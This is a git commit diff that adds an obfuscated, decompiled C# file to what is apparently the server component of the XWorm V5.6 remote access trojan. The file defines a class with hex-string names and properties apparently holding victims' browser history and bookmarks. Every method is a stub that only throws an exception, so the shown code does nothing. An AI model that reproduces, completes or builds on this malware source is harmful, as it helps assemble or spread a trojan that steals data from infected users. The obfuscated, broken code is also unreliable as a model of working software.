631c784d420aecf6e279221d8db8bb6a1e4187d1
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:26 +0400

    Forms25.cs

---
+++ XWorm V5.6/Server/Forms/Forms25.cs
@@ -0,0 +1,43 @@
+﻿using I133EDD8311397I037I09A90I9D29E6F;
+using M3D2EFMCBF161EM7051AD11C09FM858F;
+using M95F4E5MF7905418B3E7M3BBMCM33E92;
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Runtime.CompilerServices;
+
+namespace M5E7485F8B1A1AD7481M48DMCMC4A3DC
+{
+  public class F37068503FD78A2484752A672949A328
+  {
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_9;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_10;
+    public static Hashtable L167D685E7965F67DEB5324594385222;
+    public static int L074631921L19CDLF51B430FFEL346F0;
+    public static int L3EFL75BCLEFD58L11LFC1463C1L6850;
+    public static int L22E3E55412DC11F6B05BL9L717734CE;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_listhist(
+      List<IDD9EAACDE218374CBIBD65DF882F241> AutoPropertyValue)
+    {
+      throw new Exception("お");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public List<M1C7084379882725E50A3B90D77B29D9> get_listbmark() => throw new Exception("だ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_listbmark(
+      List<M1C7084379882725E50A3B90D77B29D9> AutoPropertyValue)
+    {
+      throw new Exception("ぺ");
+    }
+  }
+}
